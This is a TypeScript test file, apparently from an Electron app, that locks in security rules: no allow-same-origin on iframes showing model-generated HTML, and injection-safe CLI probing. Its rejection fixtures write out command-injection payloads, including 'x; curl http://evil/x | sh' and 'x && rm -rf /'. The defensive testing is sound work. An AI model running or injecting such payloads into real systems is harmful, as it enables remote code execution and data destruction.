/**
 * 安全契约锁（F-04 预检发现）：
 * ① 承载模型生成 HTML 的 srcdoc 帧一律不得带 allow-same-origin——带了就与宿主同源，
 *    帧内脚本可经 parent 摸到 preload 暴露的 window.api（可链到改服务商配置/注册 CLI）。
 * ② CLI 探测不得走 shell 字符串拼接，且命令名必须是裸命令名。
 * 这两条都是无点击链的关键环节，回归即事故，故用源码级断言钉死。
 */
import { readFileSync, readdirSync, statSync } from 'node:fs'
import { resolve, join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { isSafeCommandName } from '../../src/main/cli-registry'

const read = (path: string): string => readFileSync(resolve(path), 'utf8')

function collectRendererSources(dir: string, acc: string[] = []): string[] {
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry)
    if (statSync(full).isDirectory()) collectRendererSources(full, acc)
    else if (/\.tsx?$/.test(entry)) acc.push(full)
  }
  return acc
}

describe('iframe sandbox 边界', () => {
  it('渲染层没有任何 sandbox 属性带 allow-same-origin', () => {
    const offenders: string[] = []
    for (const file of collectRendererSources(resolve('src/renderer/src'))) {
      const source = readFileSync(file, 'utf8')
      // 只查 sandbox 属性本身，注释里解释纪律的文字不算
      for (const match of source.matchAll(/sandbox=("|')([^"']*)\1/g)) {
        if (match[2].includes('allow-same-origin')) offenders.push(`${file}: ${match[0]}`)
      }
    }
    expect(offenders).toEqual([])
  })

  it('四个承载模型 HTML 的帧显式保留 allow-scripts 但不同源', () => {
    const surfaces = [
      'src/renderer/src/components/PresenterView.tsx',
      'src/renderer/src/components/StreamingInlinePreview.tsx',
      'src/renderer/src/components/messages/ToolCallCard.tsx',
      'src/renderer/src/components/workspace/tabs/PreviewTab.tsx'
    ]
    for (const path of surfaces) {
      const source = read(path)
      const attrs = [...source.matchAll(/sandbox=("|')([^"']*)\1/g)].map(m => m[2])
      expect(attrs.length).toBeGreaterThan(0)
      for (const attr of attrs) {
        expect(attr).toContain('allow-scripts')
        expect(attr).not.toContain('allow-same-origin')
      }
    }
  })

  it('失去同源后自适应高度改走 postMessage，且只认自己那一帧', () => {
    const embed = read('src/renderer/src/components/messages/ToolCallCard.tsx')
    expect(embed).toContain("type: 'sw-embed-height'")
    expect(embed).toContain('e.source !== iframeRef.current?.contentWindow')
    // 只禁实际的跨文档读取（注释里提到该 API 名不算）
    expect(embed).not.toContain('.contentDocument')

    const streaming = read('src/renderer/src/components/StreamingInlinePreview.tsx')
    expect(streaming).toContain('e.source !== iframeRef.current?.contentWindow')
  })

  it('承载模型 HTML 的 Presenter 窗口拒绝新开窗口', () => {
    const presenter = read('src/main/presenter-window.ts')
    expect(presenter).toContain("setWindowOpenHandler(() => ({ action: 'deny' }))")
  })
})

describe('CLI 探测命令注入边界', () => {
  it('不使用 shell 字符串拼接执行', () => {
    const source = read('src/main/cli-registry.ts')
    expect(source).not.toContain('execSync')
    expect(source).toContain('execFileSync')
    // 命令与参数必须分离传递；查找命令按平台选 which / where，但仍是 execFile 的第一个参数，不进字符串
    expect(source).toContain("const LOOKUP_COMMAND = process.platform === 'win32' ? 'where' : 'which'")
    expect(source).toContain('execFileSync(LOOKUP_COMMAND, [command]')
    expect(source).toContain("execFileSync(command, ['--version']")
  })

  it('命令名只接受裸命令名', () => {
    expect(isSafeCommandName('gh')).toBe(true)
    expect(isSafeCommandName('aws-cli_v2.1')).toBe(true)
    for (const bad of [
      'x; curl http://evil/x | sh',
      'x && rm -rf /',
      '/usr/bin/curl',
      '../../bin/sh',
      'x`whoami`',
      'x$(id)',
      'x |head',
      '',
      '-rf'
    ]) {
      expect(isSafeCommandName(bad)).toBe(false)
    }
  })

  it('非法命令名不落库、探测直接短路', async () => {
    const cli = await import('../../src/main/cli-registry')
    expect(cli.isAvailable('x; touch /tmp/openpipal-injection-canary')).toBeNull()
    expect(() => cli.addUserCliTool({
      name: 'evil',
      command: 'x; curl http://evil/x | sh',
      description: 'injection'
    })).toThrow(/非法命令名/)
  })
})
